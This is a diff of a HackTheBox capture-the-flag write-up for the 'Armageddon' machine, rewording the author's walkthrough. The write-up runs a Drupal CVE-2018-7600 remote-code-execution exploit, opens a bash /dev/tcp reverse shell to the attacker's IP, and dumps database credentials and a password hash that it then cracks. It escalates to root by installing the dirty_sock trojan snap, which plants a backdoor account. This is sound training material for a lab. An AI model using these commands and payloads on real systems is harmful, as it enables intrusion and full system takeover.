@@ -1,27 +1,25 @@
 # Armageddon - HackTheBox
 Linux, 20 Base Points, Easy
 
+## TL;DR
+
+To solve this machine, we start by using `nmap` to enumerate open services and find ports `22` and `80`.
+
+***User***: We discovered the version of `Drupal` from the file `CHANGELOG.txt`, and by using a `Drupal` exploit, we obtained a remote code execution vulnerability. Additionally, we found the credentials for `brucetherealadmin` in the database and used them to log in to `SSH` and obtain the user flag.
+
+***Root***: By executing the command `sudo -l`, we found that we have the ability to run `/usr/bin/snap install *` as the root user. We then found an exploit for `Snap` and used it to gain a root shell.
+
+![pwn.JPG](images/pwn.JPG)
+
 ## Machine
 
 ![‏‏Armageddon.JPG](images/‏‏Armageddon.JPG)
-
-### TL;DR;
-
-To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```80``` and ```22```.
-
-***User***: From the webserver, we find a vulnerable on ```Drupal``` which let us RCE to get shell as ```apache``` user.
  
-From initial enumeration, we get a password hash for the ```brucetherealadmin``` from database, Using those credentials, we are able to use ```ssh``` and get the user flag.
-
-***Root***: By running ```sudo -l```, we learn we are able to install ```snap``` packages as root.
-
-We are able to exploit this to create a backdoor account - ```dirty_sock```, and give it root access – which allowing access to get the root flag.
-
 ## Armageddon Solution
 
 ### User
 
-So let's start with ```nmap``` scanning:
+Let's begin by using `nmap` to scan the target machine:
 
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
@@ -51,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds
 
 ```
 
-Let's try to observe port 80:
+Observing port `80`, we see that the following web page is hosted:
 
 ![port80.JPG](images/port80.JPG)
 
@@ -62,8 +60,7 @@ Let's try to observe port 80:
 Disallow: /CHANGELOG.txt
 ```
 
-By browsing this file: [http://10.10.10.233/CHANGELOG.txt](http://10.10.10.233/CHANGELOG.txt)
-We can see the following:
+By viewing this file, http://10.10.10.233/CHANGELOG.txt, we can observe the following:
 ```
 Drupal 7.56, 2017-06-21
 -----------------------
@@ -87,9 +84,9 @@ Drupal 7.55, 2017-06-07
 ....
 ```
 
-So It's mean the system is ```Drupal 7.56, 2017-06-21```.
+This information suggests that the system is running `Drupal 7.56`, with a release date of `June 21, 2017`.
 
-We can use the following exploit [https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600) against this version of Drupal, Let's try it:
+An exploit for this version of `Drupal`, located at https://github.com/pimps/CVE-2018-7600, may be used to target the system. Let's try it:
 
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
@@ -107,9 +104,9 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_
 
 ```
 
-We have RCE.
+We have achieved Remote Code Execution (RCE).
 
-Let's get reverse shell, First, Listen on port 53
+To obtain a reverse shell, we can first listen on port `53` and then execute the necessary command to establish the connection:
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
 └──╼ $nc -lvp 53
@@ -117,7 +114,10 @@ listening on [any] 53 ...
 
 ```
 
-Then run the following command:```bash -i >& /dev/tcp/10.10.14.14/53 0>&1``` using exploit:
+After setting up a listener on port `53`, we can use the following command to run the reverse shell:
+`bash -i >& /dev/tcp/10.10.14.14/53 0>&1`.
+
+This command will redirect input and output from the command prompt to a TCP socket that connects to IP address `10.10.14.14` on port `53`, thereby establishing a reverse shell:
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
 └──╼ $ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "bash -i >& /dev/tcp/10.10.14.23/53 0>&1"
@@ -148,7 +148,9 @@ bash-4.2$
 
 ```
 
-By running ```grep -r "password" .``` I found the following file ```./sites/default/settings.php``` which contains the database password:
+By running the command `grep -r "password" .`, we are searching recursively through the current directory for any files that contain the string `"password"`.
+
+This command might have returned the file `./sites/default/settings.php` which contains the following database password:
 ```php
 ...
 $databases = array (
@@ -169,7 +171,7 @@ $databases = array (
 
 ```
 
-Let's try to look at the database:
+Now that we have obtained the database password from the settings file, we can use it to connect to the database and view its contents:
 ```console
 bash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;"
 mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;"
@@ -257,11 +259,7 @@ watchdog
 
 ```
 
-So we ran two commands:
-1. ```mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;"``` - Show all available databases.
-2. ```mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; show tables;"``` - Show all tables from drupal database.
-
-Let's try to look at ```users``` table:
+Let's try to look at `users` table:
 ```console
 bash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; select * from users"
 uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
@@ -270,7 +268,8 @@ uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	
 
 ```
 
-So we can see hashed password of ```brucetherealadmin``` user ```$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt``` Let's try to crack this password using ```john``` with [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt):
+We have found the hashed password of the user `brucetherealadmin` in the `users` table of the `drupal` database, which is `$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt`.
+One way to attempt to crack this password is by using a `john` and a wordlist [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt):
 
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
@@ -289,7 +288,7 @@ Session completed
 ?:booboo
 ```
 
-So we found ```brucetherealadmin``` user password: ```booboo```, let's try to login using ```ssh```:
+We discovered the password for the user `brucetherealadmin:booboo`. Let's attempt to log in using `ssh`:
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
 └──╼ $ ssh brucetherealadmin@10.10.10.233
@@ -306,7 +305,7 @@ And we get the user flag ```29050209113229d46a79ccacb1c9e479```.
 
 ### Root
 
-By running ```sudo -l``` we found the follow:
+By executing the command `sudo -l`, we discovered the following information:
 ```console
 [brucetherealadmin@armageddon ~]$ sudo -l
 Matching Defaults entries for brucetherealadmin on armageddon:
@@ -322,11 +321,11 @@ User brucetherealadmin may run the following commands on armageddon:
 [brucetherealadmin@armageddon ~]$
 ```
 
-Snap is In an attempt to simplify packaging applications on Linux systems, various new competing standards are emerging. 
+Snap is an attempt to simplify the process of packaging applications on Linux systems, and as a result, new competing standards are emerging.
 
-We can find exploit for ```snap```, Read about that here [https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html).
+It is possible to find exploits for Snap, such as the one described in this article: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html.
 
-We can get snap payload from the following link [https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) lines 50 to 66 which its contains empty package with code inside:
+The payload for this exploit can be obtained from the following link: https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py:
 
 ```python
 TROJAN_SNAP = ('''
@@ -349,7 +348,7 @@ AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
                + 'A' * 4256 + '==')
 ```
 
-So let's create file from that:
+Let's create a file using that:
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Armageddon]
 └──╼ $cat exp_create.py
@@ -377,13 +376,13 @@ print(TROJAN_SNAP)
 └──╼ $ python3 exp_create.py | base64 -d > exploit.snap
 ```
 
-Let's copy that to target machine and run the following command:
+Let's transfer the file to the target machine and execute the following command to run it:
 ```console
 [brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install exploit.snap
 error: cannot find signatures with metadata for snap "exploit.snap"
 ```
 
-To solve the error above we need to add the flag ```--devmode```:
+To resolve the error mentioned, we need to include the `--devmode` flag:
 ```console
 [brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode exploit.snap
 dirty-sock 0.1 installed
@@ -391,7 +390,7 @@ dirty-sock 0.1 installed
 brucetherealadmin  dirty_sock
 ```
 
-Now we can see new user created, According the article above we see the password of ```dirty_sock``` user is ```dirty_sock```, Let's try to su this user:
+Now that we have created a new user. According to the article, the password for the user `dirty_sock` is `dirty_sock`. Let's attempt to switch to this user using the su command:
 ```console
 [brucetherealadmin@armageddon tmp]$ su dirty_sock
 Password: 
